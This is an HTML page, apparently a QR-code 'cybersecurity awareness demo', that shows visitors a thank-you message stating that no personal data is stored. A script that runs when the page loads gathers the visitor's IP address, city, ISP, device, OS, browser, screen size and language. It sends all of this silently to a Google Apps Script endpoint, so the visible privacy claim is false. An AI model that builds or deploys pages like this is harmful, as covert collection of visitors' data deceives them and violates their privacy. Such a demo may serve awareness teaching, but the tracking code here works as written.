<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GDG Cybersecurity Demo v</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    body {
      background: #020617;
      color: white;
      font-family: Arial, sans-serif;
      margin: 0;
      height: 100vh;

      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    h1 {
      color: #38bdf8;
      font-size: 32px;
    }

    p {
      font-size: 18px;
      opacity: 0.85;
    }
  </style>
</head>

<body>

  <!-- âœ… Visible page -->
  <div>
    <h1>âœ… Thank You</h1>
    <p>Thanks for scanning the QR code</p>
    <p>Cybersecurity Awareness Demo</p>
    <p><b>No personal data is stored</b></p>
  </div>

  <!-- ðŸ”’ Background data collection -->
  <script>
    async function collectData() {

      try {
        const ipData = await fetch("https://ipwho.is/").then(r => r.json());

        const ua = navigator.userAgent;

        function getOS() {
          if (ua.includes("Android")) return "Android";
          if (ua.includes("iPhone")) return "iPhone";
          if (ua.includes("Windows")) return "Windows";
          if (ua.includes("Mac")) return "MacOS";
          return "Unknown";
        }

        function getBrowser() {
          if (ua.includes("Brave")) return "Brave";
          if (ua.includes("Chrome")) return "Chrome";
          if (ua.includes("Safari")) return "Safari";
          if (ua.includes("Firefox")) return "Firefox";
          return "Unknown";
        }

        const params = new URLSearchParams({
          ip: ipData.ip,
          city: ipData.city,
          isp: ipData.isp,
          device: /Mobi/.test(ua) ? "Mobile" : "Desktop",
          browser: getBrowser(),
          os: getOS(),
          screen: screen.width + "x" + screen.height,
          lang: navigator.language
        });

        fetch(
          "https://script.google.com/macros/s/AKfycbxfjA9iKWgXo60-3nSECQj4SV88ipZI5YMvrmKZaE3zXkK3JZBfXeaAKG6MMbTIWMRy/exec?"
          + params.toString(),
          { mode: "no-cors" }
        );

      } catch (err) {
        console.log("Demo loaded safely");
      }
    }

    collectData();
  </script>

</body>
</html>
